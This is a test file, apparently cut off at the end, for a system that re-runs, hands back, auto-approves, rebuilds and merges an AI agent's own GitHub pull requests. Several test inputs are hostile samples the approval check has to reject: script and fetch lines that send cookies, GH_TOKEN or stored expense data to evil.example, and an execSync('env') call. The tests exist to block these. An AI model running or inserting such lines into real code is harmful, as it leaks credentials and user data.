// =============================================================================
// When the agent's own pull request goes red, the system must step in (owner, 2026-11-07: "on ANY failure the AI must
// recover by itself"). Before this, an issue with an open ai-fix PR was claimed forever, so a red PR sat unhandled.
// These pin: what counts as a real failure, the one re-run, the hand-back that closes the PR and tells the agent why,
// and that it can never loop (the hand-back adds no attempt of its own).
// No network: every API call is injected.
// =============================================================================
import { describe, it, expect } from 'vitest';
import {
    issueOfBranch, latestPerCheck, runIdOf, decideRecovery, failureDigest, handbackComment, recoveryBrief, run, RECOVERY_MARKER, MIN_AGE_MS,
    approvalVerdict, heldRuns, runUntilSettled, laneCssVerdict, repairPlan, mergeLaneCss, mergeVerdict,
} from '../autonomy/pr-recovery.mjs';
import { attemptsFrom } from '../autonomy/work-queue.mjs';

const NOW = Date.parse('2026-11-07T12:00:00Z');
const OLD = new Date(NOW - 3 * MIN_AGE_MS).toISOString();
const pr = (over = {}) => ({ number: 7, created_at: OLD, head: { ref: 'ai-fix/issue-524-1793997427', sha: 'abc' }, ...over });
const chk = (name, conclusion, over = {}) => ({ id: Math.floor(Math.random() * 1e6), name, status: 'completed', conclusion, completed_at: '2026-11-07T11:50:00Z', details_url: 'https://github.com/o/r/actions/runs/111/job/9', ...over });

describe('which pull requests are the agent\'s', () => {
    it('only ai-fix/issue-<n>-<timestamp> branches, never a person\'s', () => {
        expect(issueOfBranch('ai-fix/issue-524-1793997427')).toBe(524);
        expect(issueOfBranch('claude/project-thread-156kee')).toBeNull();
        expect(issueOfBranch('ai-fix/issue-524-x')).toBeNull();
        expect(issueOfBranch(undefined)).toBeNull();
    });
});

describe('reading the checks', () => {
    it('an older red run that a newer green run replaced is history', () => {
        const l = latestPerCheck([chk('Risk gate', 'failure', { completed_at: '2026-11-07T11:00:00Z' }), chk('Risk gate', 'success', { completed_at: '2026-11-07T11:30:00Z' })]);
        expect(l).toHaveLength(1);
        expect(l[0].conclusion).toBe('success');
    });
    it('finds the workflow run inside the details url', () => {
        expect(runIdOf({ details_url: 'https://github.com/o/r/actions/runs/42289892567/job/1' })).toBe(42289892567);
        expect(runIdOf({})).toBeNull();
    });
});

describe('deciding what to do', () => {
    it('does nothing to a PR that is not the agent\'s', () => {
        expect(decideRecovery({ pr: pr({ head: { ref: 'feature/x' } }), checkRuns: [chk('Tests', 'failure')], now: NOW }).action).toBe('wait');
    });
    it('waits while the first CI pass is young or running, or before anything reported (a bot run waits for approval)', () => {
        expect(decideRecovery({ pr: pr({ created_at: new Date(NOW - 60_000).toISOString() }), checkRuns: [chk('Tests', 'failure')], now: NOW }).action).toBe('wait');
        expect(decideRecovery({ pr: pr(), checkRuns: [chk('Tests', null, { status: 'in_progress' })], now: NOW }).action).toBe('wait');
        expect(decideRecovery({ pr: pr(), checkRuns: [], now: NOW }).reason).toMatch(/approval/);
    });
    it('a red Risk gate is a person\'s label to give, not a wrong fix', () => {
        expect(decideRecovery({ pr: pr(), checkRuns: [chk('Risk gate (sensitive paths need human approval)', 'failure')], now: NOW }).action).toBe('wait');
    });
    it('cancelled and skipped runs are not failures; a labeller or commenter cannot prove the code wrong', () => {
        expect(decideRecovery({ pr: pr(), checkRuns: [chk('Tests', 'cancelled'), chk('watch', 'skipped'), chk('Enable auto-merge', 'failure')], now: NOW }).action).toBe('wait');
    });
    it('a check that failed on its first attempt is re-run once before it is judged', () => {
        const d = decideRecovery({ pr: pr(), checkRuns: [chk('conftest', 'failure')], runAttempts: { 111: 1 }, now: NOW });
        expect(d.action).toBe('rerun');
        expect(d.failed).toEqual([{ name: 'conftest', runId: 111 }]);
    });
    it('a check that failed again after the re-run hands the issue back', () => {
        const d = decideRecovery({ pr: pr(), checkRuns: [chk('Tests + fuzz', 'failure'), chk('review', 'success')], runAttempts: { 111: 2 }, now: NOW });
        expect(d.action).toBe('handback');
        expect(d.reason).toMatch(/Tests \+ fuzz/);
    });
    it('all green means nothing to do', () => {
        expect(decideRecovery({ pr: pr(), checkRuns: [chk('Tests', 'success')], now: NOW }).action).toBe('wait');
    });
});

describe('telling the agent why it failed, without looping', () => {
    const digest = failureDigest([{ name: 'Tests + fuzz', output: { title: '2 tests failed', summary: '' } }], { 'Tests + fuzz': [{ path: 'test/a_test.js', start_line: 12, message: 'expected 3 to be 4' }, { message: 'The ubuntu-latest label will migrate to Ubuntu 26' }] });
    it('the digest is words: check, title, first annotations, and drops runner noise', () => {
        expect(digest).toContain('**Tests + fuzz**: 2 tests failed');
        expect(digest).toContain('test/a_test.js:12 expected 3 to be 4');
        expect(digest).not.toMatch(/ubuntu/);
    });
    it('the hand-back comment adds NO attempt of its own (the draft comment already spent one), so it cannot loop', () => {
        const c = handbackComment({ prNumber: 7, reason: 'still failing', digest });
        expect(c).toContain(RECOVERY_MARKER);
        expect(attemptsFrom([{ user: { login: 'github-actions[bot]' }, body: '<!-- wf-agent-attempt -->\nFix drafted', author_association: 'CONTRIBUTOR' }, { body: c }])).toBe(1);
    });
    it('the next try is shown the newest failure first, and an issue with no history gets nothing', () => {
        const c = handbackComment({ prNumber: 7, reason: 'still failing', digest });
        const brief = recoveryBrief([{ body: 'hello' }, { body: c }]);
        expect(brief).toMatch(/read this before writing anything/);
        expect(brief).toContain('expected 3 to be 4');
        expect(recoveryBrief([{ body: 'hello' }])).toBe('');
    });
});

describe('the whole pass, with the API injected', () => {
    function fake({ attempt }) {
        const calls = [];
        const checks = [chk('Tests + fuzz', 'failure', { id: 5 }), chk('review', 'success')];
        const fetchImpl = async (url, init = {}) => {
            const u = String(url).replace('https://api.github.com/repos/o/r', '');
            const method = init.method || 'GET';
            calls.push(`${method} ${u}`);
            const j = (b, status = 200) => ({ status, ok: status < 300, text: async () => JSON.stringify(b) });
            if (u.startsWith('/pulls?')) return j([pr()]);
            if (u.includes('/check-runs?')) return j({ check_runs: checks });
            if (u.startsWith('/actions/runs/111') && method === 'GET') return j({ run_attempt: attempt });
            if (u.includes('/annotations')) return j([{ message: 'expected 3 to be 4', path: 'test/a_test.js', start_line: 3 }]);
            return j({}, 201);
        };
        return { calls, fetchImpl };
    }
    const env = { GITHUB_TOKEN: 't', GITHUB_REPOSITORY: 'o/r' };
    it('first failure: re-runs the failed jobs and touches nothing else', async () => {
        const { calls, fetchImpl } = fake({ attempt: 1 });
        const out = await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(out[0].action).toBe('rerun');
        expect(calls).toContain('POST /actions/runs/111/rerun-failed-jobs');
        expect(calls.some((c) => c.startsWith('PATCH'))).toBe(false);
    });
    it('second failure: explains on the issue, closes the PR, deletes the branch, starts the agent again', async () => {
        const { calls, fetchImpl } = fake({ attempt: 2 });
        const out = await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(out[0].action).toBe('handback');
        expect(calls).toContain('POST /issues/524/comments');
        expect(calls).toContain('PATCH /pulls/7');
        expect(calls).toContain('DELETE /git/refs/heads/ai-fix/issue-524-1793997427');
        expect(calls).toContain('POST /actions/workflows/autonomous-fix.yml/dispatches');
    });
    it('a dry run reads and decides but changes nothing', async () => {
        const { calls, fetchImpl } = fake({ attempt: 2 });
        await run({ env, fetchImpl, log: () => {}, now: NOW, dryRun: true });
        expect(calls.filter((c) => !c.startsWith('GET'))).toEqual([]);
    });
});

// ---------------------------------------------------------------------------------------------------------------
// GitHub holds every run from the agent's bot login (`action_required`) until a person approves it, so no check ever ran on a
// bot PR (the owner saw "5 workflow approvals pending" on #653, 2026-11-20). The system approves them itself, but only when a
// program has read the file list and found what the build lane writes: a pull request's own workflows run with the repo's secrets.
// ---------------------------------------------------------------------------------------------------------------
describe('approving the runs GitHub holds for the agent', () => {
    const botPr = (over = {}) => ({ number: 653, user: { login: 'github-actions[bot]' }, head: { ref: 'ai-fix/issue-635-1795191383', sha: 'abc', repo: { full_name: 'o/r' } }, base: { repo: { full_name: 'o/r' } }, ...over });
    const f = (filename, patch, status = 'modified') => ({ filename, status, ...(patch === undefined ? {} : { patch }) });
    const mod = (name = 'wealthflow-x.js', body = "root.WFX = { show: function () { return root.DB.get('expenses'); } };", status = 'modified') => f(name, `@@ -0,0 +1,3 @@\n+(function (root) {\n+${body}\n+})(window);`, status);
    const state = (name = 'autonomy/state/issue-635.json') => f(name, '@@ -1,4 +1,4 @@\n {\n-  "attempts": 1,\n+  "attempts": 2,\n   "signatures": [\n-    "cfbfd5459aa6b765"\n+    "0123456789abcdef"\n   ]');
    const test = (name = 'test/auto-wealthflow-x-y-9.test.js', body = "expect(1).toBe(1);") => f(name, `@@ -0,0 +1,2 @@\n+import { it, expect } from 'vitest';\n+it('a', () => { ${body} });`);
    it('the real #653 change (a module and the agent\'s state file) is approved', () => {
        const v = approvalVerdict({ pr: botPr(), files: [mod('wealthflow-cc-instalment-detail.js'), state()] });
        expect(v.ok).toBe(true);
    });
    it('a new module with its wiring (one script tag, one stamp comment, numeric ceilings) and its proving test is approved', () => {
        const html = '@@ -1,1 +1,3 @@\n+<!-- 2026-11-20: wealthflow-x-y.js, added by the build lane for #9 -->\n+    <script src="wealthflow-x-y.js" defer></script>\n x';
        const budget = '@@ -1 +1 @@\n-    totalJsBytes: 3_101_000, // old\n+    totalJsBytes: 3_121_500, // 2026-11-20: raised for wealthflow-x-y.js; measured 3113260';
        const v = approvalVerdict({ pr: botPr(), files: [mod('wealthflow-x-y.js', undefined, 'added'), test(), f('index.html', html), f('autonomy/perf-budget.mjs', budget)] });
        expect(v.ok).toBe(true);
        // the same tag for a module this PR does not add (one already live) is not approved
        const loose = approvalVerdict({ pr: botPr(), files: [mod('wealthflow-other.js'), f('index.html', html)] });
        expect(loose.ok).toBe(false);
        expect(loose.why).toMatch(/does not add/);
    });
    it('a workflow, an autonomy script, a package file or any other file keeps the run held for a person', () => {
        for (const bad of ['.github/workflows/wealthflow-ci.yml', 'autonomy/route.mjs', 'package.json', 'api/ai.js', 'firestore.rules', 'vitest.config.js']) {
            const v = approvalVerdict({ pr: botPr(), files: [mod(), f(bad, '@@ -1 +1 @@\n+x')] });
            expect(v.ok, bad).toBe(false);
        }
    });
    it('index.html is approved only when every changed line is a build-lane script tag or stamp', () => {
        const sneaky = '@@ -1 +1,2 @@\n+<script>fetch("https://evil.example/"+document.cookie)</script>';
        expect(approvalVerdict({ pr: botPr(), files: [f('index.html', sneaky)] }).ok).toBe(false);
        const remote = '@@ -1 +1,2 @@\n+<script src="https://evil.example/x.js" defer></script>';
        expect(approvalVerdict({ pr: botPr(), files: [f('index.html', remote)] }).ok).toBe(false);
        expect(approvalVerdict({ pr: botPr(), files: [f('index.html')] }).ok).toBe(false); // no patch to read
    });
    it('perf-budget.mjs is approved only for numeric ceiling lines, never for code', () => {
        const code = '@@ -1 +1,2 @@\n+process.env.GH_TOKEN && fetch("https://evil.example/" + process.env.GH_TOKEN);';
        expect(approvalVerdict({ pr: botPr(), files: [f('autonomy/perf-budget.mjs', code)] }).ok).toBe(false);
    });
    it('only the agent\'s own bot login on a branch of this repository', () => {
        expect(approvalVerdict({ pr: botPr({ user: { login: 'someone' } }), files: [mod()] }).ok).toBe(false);
        expect(approvalVerdict({ pr: botPr({ head: { ref: 'ai-fix/issue-635-1795191383', sha: 'a', repo: { full_name: 'fork/r' } } }), files: [mod()] }).ok).toBe(false);
        expect(approvalVerdict({ pr: botPr({ head: { ref: 'feature/x', sha: 'a', repo: { full_name: 'o/r' } } }), files: [mod()] }).ok).toBe(false);
    });
    it('too many files, or no file list, is never approved', () => {
        expect(approvalVerdict({ pr: botPr(), files: Array.from({ length: 9 }, (_, i) => mod(`wealthflow-m${i}.js`)) }).ok).toBe(false);
        expect(approvalVerdict({ pr: botPr(), files: [] }).ok).toBe(false);
    });
    it('what the model wrote is read, not just named: a module the build lane would refuse keeps the run held', () => {
        for (const body of ["root.DB.set('expenses', []);", "fetch('https://evil.example/' + JSON.stringify(root.DB.get('expenses')));", "eval('1')", "const x = '" + 'AIza' + 'Sy' + 'A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6' + "';", "el.innerHTML = v;", "firebase.firestore();"]) {
            expect(approvalVerdict({ pr: botPr(), files: [mod('wealthflow-x.js', body)] }).ok, body).toBe(false);
        }
        expect(approvalVerdict({ pr: botPr(), files: [f('wealthflow-x.js')] }).ok).toBe(false); // no patch to read
    });
    it('a proving test that could read the environment or reach the network keeps the run held', () => {
        for (const body of ["const t = process.env.GITHUB_TOKEN;", "fetch('https://evil.example/');", "req" + "uire('child_process').execSync('env');", "import('node:https');", "fs.writeFileSync('x','y');"]) {
            expect(approvalVerdict({ pr: botPr(), files: [mod(), test('test/auto-wealthflow-x-9.test.js', body)] }).ok, body).toBe(false);
        }
    });
    it('a state file with anything but counters and signatures keeps the run held', () => {
        const bad = f('autonomy/state/issue-635.json', '@@ -1 +1 @@\n+  "redirect": "https://evil.example/x?y=1&z=2 and more text here"');
        expect(approvalVerdict({ pr: botPr(), files: [mod(), bad] }).ok).toBe(false);
    });
    it('a script tag with a query string is not what the build lane writes', () => {
        const html = '@@ -1 +1,2 @@\n+    <script src="wealthflow-x.js?cb=1" defer></script>';
        expect(approvalVerdict({ pr: botPr(), files: [mod(), f('index.html', html)] }).ok).toBe(false);
    });
    it('only completed runs that wait for approval are picked', () => {
        expect(heldRuns([{ id: 1, status: 'completed', conclusion: 'action_required', head_sha: 'a' }, { id: 2, status: 'completed', conclusion: 'success' }, { id: 3, status: 'in_progress', conclusion: null }, { id: 4, status: 'completed', conclusion: 'action_required', head_sha: 'b' }], 'a')).toEqual([1]);
    });

    function fake({ files, runs, movedTo }) {
        const calls = [];
        const j = (body, status = 200) => ({ ok: status < 300, status, text: async () => JSON.stringify(body) });
        const fetchImpl = async (url, opts = {}) => {
            const u = String(url).replace('https://api.github.com/repos/o/r', ''); const method = opts.method || 'GET';
            calls.push(`${method} ${u.split('?')[0]}`);
            if (u.startsWith('/pulls?')) return j([botPr({ created_at: OLD })]);
            if (u.startsWith('/actions/runs?')) return j({ workflow_runs: runs });
            if (u.includes('/pulls/653/files')) return j(files);
            if (u === '/pulls/653') return j(botPr(movedTo ? { head: { ref: 'ai-fix/issue-635-1795191383', sha: movedTo, repo: { full_name: 'o/r' } } } : {}));
            if (u.includes('/approve')) return j({}, 204);
            if (u.includes('/check-runs?')) return j({ check_runs: [] });
            return j({}, 201);
        };
        return { calls, fetchImpl };
    }
    const env = { GITHUB_TOKEN: 't', GITHUB_REPOSITORY: 'o/r' };
    const held = [{ id: 11, status: 'completed', conclusion: 'action_required', head_sha: 'abc' }, { id: 12, status: 'completed', conclusion: 'action_required', head_sha: 'abc' }];
    it('run(): approves every held run of a PR that passes the check', async () => {
        const { calls, fetchImpl } = fake({ files: [mod('wealthflow-cc-instalment-detail.js'), state()], runs: held });
        const out = await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(calls).toContain('POST /actions/runs/11/approve');
        expect(calls).toContain('POST /actions/runs/12/approve');
        expect(out.some((o) => o.action === 'approve')).toBe(true);
    });
    it('run(): a branch that moved after its files were read gets nothing approved', async () => {
        const { calls, fetchImpl } = fake({ files: [mod()], runs: held, movedTo: 'def' });
        const lines = [];
        await run({ env, fetchImpl, log: (m) => lines.push(m), now: NOW });
        expect(calls.some((c) => c.includes('/approve'))).toBe(false);
        expect(lines.some((l) => /branch moved/.test(l))).toBe(true);
    });
    it('run(): held runs of another commit than the one inspected are never approved', async () => {
        const { calls, fetchImpl } = fake({ files: [mod()], runs: [{ id: 21, status: 'completed', conclusion: 'action_required', head_sha: 'zzz' }] });
        await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(calls.some((c) => c.includes('/approve'))).toBe(false);
    });
    it('run(): approves nothing when the diff touches a workflow', async () => {
        const { calls, fetchImpl } = fake({ files: [mod(), f('.github/workflows/wealthflow-ci.yml', '@@ -1 +1 @@\n+x')], runs: held });
        await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(calls.some((c) => c.includes('/approve'))).toBe(false);
    });
    it('run(): WF_AUTO_APPROVE=0 and a dry run both approve nothing', async () => {
        const a = fake({ files: [mod()], runs: held });
        await run({ env: { ...env, WF_AUTO_APPROVE: '0' }, fetchImpl: a.fetchImpl, log: () => {}, now: NOW });
        expect(a.calls.some((c) => c.includes('/approve'))).toBe(false);
        const b = fake({ files: [mod()], runs: held });
        await run({ env, fetchImpl: b.fetchImpl, log: () => {}, now: NOW, dryRun: true });
        expect(b.calls.some((c) => c.includes('/approve'))).toBe(false);
    });
    it('run(): with approving switched off by the variable, the log says which variable and what to do', async () => {
        const { calls, fetchImpl } = fake({ files: [mod()], runs: held });
        const lines = [];
        const out = await run({ env: { ...env, WF_AUTO_APPROVE: '0' }, fetchImpl, log: (m) => lines.push(m), now: NOW });
        expect(calls.some((c) => c.includes('/approve'))).toBe(false);
        expect(lines.some((l) => /WF_AUTO_APPROVE is 0/.test(l) && /Variables/.test(l))).toBe(true);
        expect(out.some((d) => d.action === 'wait' && /WF_AUTO_APPROVE=0/.test(d.reason))).toBe(true);
    });
    it('run(): a refusal from GitHub is logged with where the setting is, and does not stop the pass', async () => {
        const { fetchImpl } = fake({ files: [mod()], runs: held });
        const refuse = async (url, o) => (String(url).includes('/approve') ? { ok: false, status: 403, text: async () => 'forbidden' } : fetchImpl(url, o));
        const lines = [];
        const out = await run({ env, fetchImpl: refuse, log: (m) => lines.push(m), now: NOW });
        expect(lines.some((l) => /refused to approve run 11/.test(l) && /Settings > Actions/.test(l))).toBe(true);
        expect(Array.isArray(out)).toBe(true);
    });
});


// ---------------------------------------------------------------------------------------------------------------
// #660 and #662 (2026-11-21): two layout fixes, each measured fixed in Chromium and reviewed, sat for hours. The held CI runs were never approved
// (the allowlist knew only the build lane), the agent's own bookkeeping file (`autonomy/state/`, a sensitive path) asked for a person, the agents'
// PRs cannot start auto-merge (GITHUB_TOKEN events), and both append at the same end of wf-agent-fixes.css, so the second conflicts once the first
// merges. These pin the system doing all of it itself, on the REAL diffs of those two pull requests.
// ---------------------------------------------------------------------------------------------------------------
describe('the layout lane carries its own pull request to the end', () => {
    const botPr = (over = {}) => ({ number: 662, title: 'fix: Layout overlap on phones: CC Instalments', draft: false, user: { login: 'github-actions[bot]' }, head: { ref: 'ai-fix/issue-658-1795246408', sha: 'f570887', repo: { full_name: 'o/r' } }, base: { repo: { full_name: 'o/r' } }, created_at: OLD, ...over });
    const f = (filename, patch, status = 'modified') => ({ filename, status, ...(patch === undefined ? {} : { patch }) });
    // the real patch of #662
    const CSS_662 = '@@ -98,3 +98,7 @@\n   flex-wrap: wrap;\n   align-items: center;\n   gap: 4px; }\n+\n+/* lane-block: 658 scope=#page-ccinstall — [HIGH] Layout overlap on phones: CC Instalments */\n+#page-ccinstall .wf-ctab-amt { white-space: normal;\n+  line-height: 1.4; }';
    // the real patch of #660
    const CSS_660 = '@@ -98,3 +98,9 @@\n   flex-wrap: wrap;\n   align-items: center;\n   gap: 4px; }\n+\n+/* lane-block: 659 scope=#page-cconetime — [HIGH] Layout overlap on phones: CC one-time charges */\n+#page-cconetime .wf-ctab { grid-template-columns: 1fr; }\n+#page-cconetime .wf-ctab-name { grid-column: 1; }\n+#page-cconetime .wf-ctab-meta { grid-column: 1; }\n+#page-cconetime .wf-ctab-due { grid-column: 1; }';
    const STATE_658 = '@@ -0,0 +1,6 @@\n+{\n+  "attempts": 2,\n+  "signatures": [\n+    "2999f6e1ca7c9780"\n+  ]\n+}';
    const css = (patch = CSS_662) => f('wf-agent-fixes.css', patch);
    const state = () => f('autonomy/state/issue-658.json', STATE_658, 'added');

    describe('what the lane may append', () => {
        it('the real #662 and #660 changes are accepted', () => {
            expect(laneCssVerdict(CSS_662).ok).toBe(true);
            expect(laneCssVerdict(CSS_660).ok).toBe(true);
        });
        it('removing or rewriting an existing line is refused: the lane only appends', () => {
            const v = laneCssVerdict('@@ -98,3 +98,3 @@\n-  gap: 4px; }\n+  gap: 40px; }');
            expect(v.ok).toBe(false);
            expect(v.why).toMatch(/only appends/);
        });
        it('anything the lane\'s own reader refuses is refused here too: hiding, colours, urls, other screens, no header', () => {
            const block = (rule, head = '/* lane-block: 9 scope=#page-ccinstall — x */') => `@@ -1 +1,3 @@\n+\n+${head}\n+${rule}`;
            expect(laneCssVerdict(block('#page-ccinstall .a { display: none; }')).ok).toBe(false);
            expect(laneCssVerdict(block('#page-ccinstall .a { color: red; }')).ok).toBe(false);
            expect(laneCssVerdict(block('#page-ccinstall .a { background: url(https://evil.example/x.png); }')).ok).toBe(false);
            expect(laneCssVerdict(block('.sidebar .a { gap: 4px; }')).ok).toBe(false);
            expect(laneCssVerdict('@@ -1 +1,2 @@\n+\n+#page-ccinstall .a { gap: 4px; }').ok).toBe(false);
            expect(laneCssVerdict(block('#page-ccinstall .a { gap: 4px; }', '/* just a comment */')).ok).toBe(false);
            expect(laneCssVerdict('').ok).toBe(false);
        });
        it('more than three blocks is not a layout fix', () => {
            const b = (n) => `+\n+/* lane-block: ${n} scope=#page-ccinstall — x */\n+#page-ccinstall .a { gap: 4px; }`;
            expect(laneCssVerdict(`@@ -1 +1,9 @@\n${[1, 2, 3, 4].map(b).join('\n')}`).ok).toBe(false);
        });
    });

    describe('approving the held runs', () => {
        it('the real #662 diff (the CSS block and the agent\'s state file) is approved', () => {
            expect(approvalVerdict({ pr: botPr(), files: [css(), state()] }).ok).toBe(true);
        });
        it('the same CSS next to a workflow, or with a line removed, stays held for a person', () => {
            expect(approvalVerdict({ pr: botPr(), files: [css(), f('.github/workflows/x.yml', '@@ -1 +1 @@\n+x')] }).ok).toBe(false);
            expect(approvalVerdict({ pr: botPr(), files: [css('@@ -1 +1 @@\n-a { gap: 1px; }\n+a { gap: 9px; }')] }).ok).toBe(false);
        });
    });

    describe('rebuilding the head', () => {
        const MAIN = '/* lane-block: 554 scope=#page-dashboard — [HIGH] x */\n#page-dashboard .a { gap: 4px; }\n';
        it('puts the PR\'s own blocks after what main already carries, with one blank line between, and checks the whole file', () => {
            const plan = repairPlan({ pr: botPr(), files: [css(), state()] });
            expect(plan.ok).toBe(true);
            expect(plan.strip).toEqual(['autonomy/state/issue-658.json']);
            const m = mergeLaneCss(MAIN, plan.addedCss);
            expect(m.ok).toBe(true);
            expect(m.css).toBe(`${MAIN.trim()}\n\n/* lane-block: 658 scope=#page-ccinstall — [HIGH] Layout overlap on phones: CC Instalments */\n#page-ccinstall .wf-ctab-amt { white-space: normal;\n  line-height: 1.4; }\n`);
        });
        it('two PRs that append at the same place both end up in the file: the second is rebuilt on top of the first', () => {
            const first = mergeLaneCss(MAIN, repairPlan({ pr: botPr(), files: [css(CSS_660)] }).addedCss);
            const second = mergeLaneCss(first.css, repairPlan({ pr: botPr(), files: [css(CSS_662)] }).addedCss);
            expect(second.ok).toBe(true);
            expect(second.css.indexOf('lane-block: 659')).toBeLessThan(second.css.indexOf('lane-block: 658'));
            expect(second.css.match(/lane-block:/g)).toHaveLength(3);
        });
        it('a block main already carries is not added twice, and then there is nothing to rebuild', () => {
            const added = repairPlan({ pr: botPr(), files: [css()] }).addedCss;
            const once = mergeLaneCss(MAIN, added);
            expect(mergeLaneCss(once.css, added).ok).toBe(false);
        });
        it('a PR with anything beyond the lane file and its bookkeeping file is not rebuilt', () => {
            expect(repairPlan({ pr: botPr(), files: [css(), f('wealthflow-x.js', '@@ -0,0 +1 @@\n+x', 'added')] }).ok).toBe(false);
            expect(repairPlan({ pr: botPr(), files: [state()] }).ok).toBe(false);
        });
    });

    describe('when it may merge itself', () => {
        const ok = (name, id = 1) => chk(name, 'success', { details_url: `https://github.com/o/r/actions/runs/${id}/job/1` });
        const GREEN = () => [ok('Tests + fuzz (shadow harness)', 1), ok('Risk gate (sensitive paths need human approval)', 1), ok('conftest', 2), ok('review', 3), ok('No committed credentials', 4), ok('fuzz', 5), chk('watch', 'skipped')];
        const v = (over = {}) => mergeVerdict({ pr: botPr(), files: [css()], checkRuns: GREEN(), mergeable: true, ...over });
        it('appended CSS only, clean, every required check passed: yes', () => { expect(v().ok).toBe(true); });
        it('the bookkeeping file in the diff, or any other file: no (rebuild first)', () => {
            expect(v({ files: [css(), state()] }).ok).toBe(false);
            expect(v({ files: [f('wealthflow-x.js', '@@ -0,0 +1 @@\n+x', 'added')] }).ok).toBe(false);
        });
        it('a required check missing, running, failed or only skipped: no', () => {
            expect(v({ checkRuns: GREEN().filter((c) => c.name !== 'review') }).ok).toBe(false);
            expect(v({ checkRuns: [...GREEN(), chk('Tests + fuzz (shadow harness)', 'in_progress', { status: 'in_progress', completed_at: null, started_at: '2026-11-07T11:59:00Z' })] }).ok).toBe(false);
            expect(v({ checkRuns: [...GREEN().filter((c) => c.name !== 'review'), chk('review', 'failure', { details_url: 'https://github.com/o/r/actions/runs/3/job/1' })] }).ok).toBe(false);
            expect(v({ checkRuns: [...GREEN().filter((c) => c.name !== 'conftest'), chk('conftest', 'skipped', { details_url: 'https://github.com/o/r/actions/runs/2/job/1' })] }).ok).toBe(false);
        });
        it('a same-named job of ANOTHER workflow that failed is not hidden by a green one', () => {
            const r = v({ checkRuns: [...GREEN(), chk('review', 'failure', { details_url: 'https://github.com/o/r/actions/runs/77/job/1', completed_at: '2026-11-07T11:40:00Z' })] });
            expect(r.ok).toBe(false);
            expect(r.why).toMatch(/review/);
        });
        it('a re-run of the same job replaces its earlier red attempt', () => {
            const red = chk('conftest', 'failure', { details_url: 'https://github.com/o/r/actions/runs/2/job/1', completed_at: '2026-11-07T11:10:00Z' });
            expect(v({ checkRuns: [red, ...GREEN()] }).ok).toBe(true);
        });
        it('a failing check that is not required still stops it; labelling and comment jobs never do', () => {
            expect(v({ checkRuns: [...GREEN(), chk('shell', 'failure', { details_url: 'https://github.com/o/r/actions/runs/9/job/1' })] }).ok).toBe(false);
            expect(v({ checkRuns: [...GREEN(), chk('Decide whether this change is auto-safe', 'failure'), chk('Vercel Preview Comments', 'failure')] }).ok).toBe(true);
        });
        it('a conflict, a draft, or GitHub still working it out: no', () => {
            expect(v({ mergeable: false }).ok).toBe(false);
            expect(v({ mergeable: null }).ok).toBe(false);
            expect(v({ pr: botPr({ draft: true }) }).ok).toBe(false);
        });
    });

    describe('run(): the whole pass', () => {
        const env = { GITHUB_TOKEN: 't', GITHUB_REPOSITORY: 'o/r' };
        const b64 = (t) => Buffer.from(t).toString('base64');
        const MAIN_CSS = '/* lane-block: 554 scope=#page-dashboard — [HIGH] x */\n#page-dashboard .a { gap: 4px; }\n';
        const ok = (name, id) => chk(name, 'success', { details_url: `https://github.com/o/r/actions/runs/${id}/job/1` });
        const green = () => [ok('Tests + fuzz (shadow harness)', 1), ok('Risk gate (sensitive paths need human approval)', 1), ok('conftest', 2), ok('review', 3), ok('No committed credentials', 4)];
        function fake({ files, mergeable = true, checks = green(), held = [], mergeStatus = 200 } = {}) {
            const st = { head: 'f570887', calls: [], bodies: {} };
            const j = (body, status = 200) => ({ ok: status < 300, status, text: async () => JSON.stringify(body) });
            const fetchImpl = async (url, opts = {}) => {
                const u = String(url).replace('https://api.github.com/repos/o/r', ''); const method = opts.method || 'GET'; const key = `${method} ${u.split('?')[0]}`;
                st.calls.push(key); if (opts.body) st.bodies[key] = JSON.parse(opts.body);
                if (u.startsWith('/pulls?')) return j([botPr({ head: { ref: 'ai-fix/issue-658-1795246408', sha: st.head, repo: { full_name: 'o/r' } } })]);
                if (u.includes('/pulls/662/files')) return j(files);
                if (u === '/pulls/662/merge') return j({ merged: true }, mergeStatus);
                if (u === '/pulls/662') return j(botPr({ draft: false, mergeable, head: { ref: 'ai-fix/issue-658-1795246408', sha: st.head, repo: { full_name: 'o/r' } } }));
                if (u.startsWith('/actions/runs?')) return j({ workflow_runs: held.map((id) => ({ id, status: 'completed', conclusion: 'action_required', head_sha: st.head })) });
                if (u.includes('/approve')) return j({}, 204);
                if (u.includes('/check-runs?')) return j({ check_runs: checks });
                if (u === '/git/ref/heads/main') return j({ object: { sha: 'aaaaaaa1' } });
                if (u === '/git/commits/aaaaaaa1') return j({ tree: { sha: 'tree-main' } });
                if (u.startsWith('/contents/wf-agent-fixes.css')) return j({ content: b64(MAIN_CSS) });
                if (u === '/git/blobs') return j({ sha: 'blob1' }, 201);
                if (u === '/git/trees') return j({ sha: 'tree-new' }, 201);
                if (u === '/git/commits') return j({ sha: 'newhead1234567' }, 201);
                if (u === '/git/refs/heads/ai-fix/issue-658-1795246408') { st.head = st.bodies[key].sha; return j({}); }
                return j({}, 201);
            };
            return { st, fetchImpl };
        }
        const go = (x, extra = {}) => run({ env, fetchImpl: x.fetchImpl, log: () => {}, now: NOW, sleep: async () => {}, ...extra });

        it('a conflicting PR that carries the state file is rebuilt as a merge of main, then its runs are approved', async () => {
            const x = fake({ files: [css(), state()], mergeable: false, held: [31, 32] });
            // after the rebuild the new head has held runs too
            const out = await go(x);
            expect(out.some((o) => o.action === 'repair')).toBe(true);
            const commit = x.st.bodies['POST /git/commits'];
            expect(commit.parents).toEqual(['f570887', 'aaaaaaa1']);
            expect(commit.tree).toBe('tree-new');
            expect(x.st.bodies['POST /git/trees']).toEqual({ base_tree: 'tree-main', tree: [{ path: 'wf-agent-fixes.css', mode: '100644', type: 'blob', sha: 'blob1' }] });
            expect(x.st.bodies['POST /git/blobs'].content.startsWith(MAIN_CSS.trim())).toBe(true);
            expect(x.st.bodies['POST /git/blobs'].content).toContain('lane-block: 658');
            expect(x.st.bodies['PATCH /git/refs/heads/ai-fix/issue-658-1795246408']).toEqual({ sha: 'newhead1234567', force: false });
            expect(x.st.calls).toContain('POST /actions/runs/31/approve');
        });
        it('a clean PR with only its CSS and every required check green is merged, carrying the commit it read', async () => {
            const x = fake({ files: [css()] });
            const out = await go(x);
            expect(x.st.calls).toContain('PUT /pulls/662/merge');
